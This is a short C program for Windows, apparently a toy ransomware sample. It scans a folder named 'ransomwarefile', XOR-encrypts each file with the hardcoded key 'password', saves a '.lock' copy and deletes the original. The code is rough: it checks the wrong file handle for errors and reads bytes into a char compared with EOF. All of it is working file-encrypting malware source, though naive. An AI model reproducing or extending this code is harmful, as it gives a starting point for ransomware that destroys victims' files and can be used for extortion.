#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

int main()
{
	char pass[] = "password";
	int passLength = strlen(pass);
	char path[] = ".\\ransomwarefile\\*";
	WIN32_FIND_DATA findData;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	hFind = FindFirstFile(path, &findData);

	if (hFind == INVALID_HANDLE_VALUE)
	{
		printf("Error");
	}

	do
	{
		if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0)
		{
			continue;
		}

		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			printf("DIRECTORY: %s\n", findData.cFileName);
		}
		else
		{
			char filePath[MAX_PATH];
            char filePathDest[MAX_PATH];

			snprintf(filePath, MAX_PATH, "ransomwarefile/%s", findData.cFileName);
            snprintf(filePathDest, MAX_PATH, "ransomwarefile/%s.lock", findData.cFileName);

			FILE *fp = fopen(filePath, "rb");
			if (fp == NULL)
			{
				printf("cannot open the origin file");
				continue;
			}

			FILE *dest_fp = fopen(filePathDest, "wb");
			if (fp == NULL)
			{
				printf("cannot open the origin file");
				continue;
			}

			char ch;
			int i = 0;
			while ((ch = fgetc(fp)) != EOF)
			{
				char ch_cypher = ch ^ pass[i % passLength];
				fputc(ch_cypher, dest_fp);
				i++;
			}

			fclose(fp);
			fclose(dest_fp);
			if (remove(filePath) != 0) {
                printf("Error al eliminar el archivo original: %s\n", filePath);
            }
		}

	} while (FindNextFile(hFind, &findData) != 0);

	FindClose(hFind);
	return 0;
}